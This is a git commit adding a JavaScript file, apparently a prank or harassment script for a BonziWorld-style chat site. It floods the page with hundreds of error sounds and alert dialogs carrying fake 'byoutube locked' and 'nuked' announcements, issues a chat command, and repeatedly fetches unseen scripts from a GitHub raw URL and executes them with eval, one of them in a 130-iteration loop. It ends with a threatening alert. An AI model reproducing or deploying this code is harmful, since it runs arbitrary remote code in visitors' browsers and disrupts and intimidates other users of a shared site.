674b5c3faf9590ac703f9cd7afb9cd55fe7ac3a8
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2026-08-10 15:47:36 +0300

    Add byoutubeMess and related functions

---
+++ ANGRYUB.js
@@ -0,0 +1,53 @@
+function byoutubeMess(){
+    new Audio("/sfx/error.mp3").play().catch(() => {});
+    Dialog.alert({html: 'byoutube has been '+(Math.random() < 0.5 ? "un" : "")+'locked', title: 'Announcement from ₰'});
+};
+function permLockByoutubeMess(){
+    const distortSound = new Audio("/sfx/error.mp3").play().catch(() => {});
+    distortSound.playbackRate = 1+(((Math.random() * 2)-1)/5);
+    Dialog.alert({html: 'byoutube has been permenantly locked', title: 'Announcement from ₰'});
+};
+function Mess(){
+    const distortSound = new Audio("/sfx/error.mp3").play().catch(() => {});
+    distortSound.playbackRate = 1+(((Math.random() * 2)-1)/5);
+    Dialog.alert({html: 'BYOUTUBE IS ABOUT TO GET NUKED', title: 'Announcement from ₰'});
+};
+function sayAsUbAnomaly(x){
+    new Audio("/sfx/error.mp3").play().catch(() => {});
+    Dialog.alert({html: x, title: 'Announcement from ₰'});
+}
+for (let i = 0; i < 13; i++) {
+    setTimeout(byoutubeMess, 100 * i);
+}
+setTimeout(()=>{
+    for (let i = 0; i < 19; i++) {
+        setTimeout(permLockByoutubeMess, 100 * i);
+    }
+},1300);
+setTimeout(()=>{
+    for (let i = 0; i < 130; i++) {
+        setTimeout(Mess, 10 * i);
+    }
+setTimeout(()=>{
+    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/BYT_EXPLODE_NOW2.js').then(r=>r.text()).then(eval);
+setTimeout(()=>{
+    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/BYT_EXPLODE_NOW2.js').then(r=>r.text()).then(eval);
+setTimeout(()=>{
+    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/BYT_REMOVER_FOREVER.js').then(r=>r.text()).then(eval);
+    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/UB.js').then(r=>r.text()).then(eval);
+    for (let i = 0; i < 130; i++) {
+        setTimeout(()=>{sayAsUbAnomaly("YOU CANNOT BE DOING THIS IN UB VALLEY.")}, 40 * i);
+    }
+setTimeout(()=>{
+    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/UBICE.js').then(r=>r.text()).then(eval);
+    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/999.js').then(r=>r.text()).then(eval);
+    cmd("byoutube us07_zCCZt8");
+    alert("YOU KNOW WHAT YOU HAVE DONE IS VERY REGRETFUL, YOU MADE EVERYBODY IN UB VALLEY ATTACK YOU");
+    for (let i = 0; i < 130; i++) {
+        setTimeout(()=>{fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/BYT_EXPLODE_NOW2.js').then(r=>r.text()).then(eval)}, 100 * i);
+    }
+},400);
+},130);
+},130);
+},1300);
+},3200);
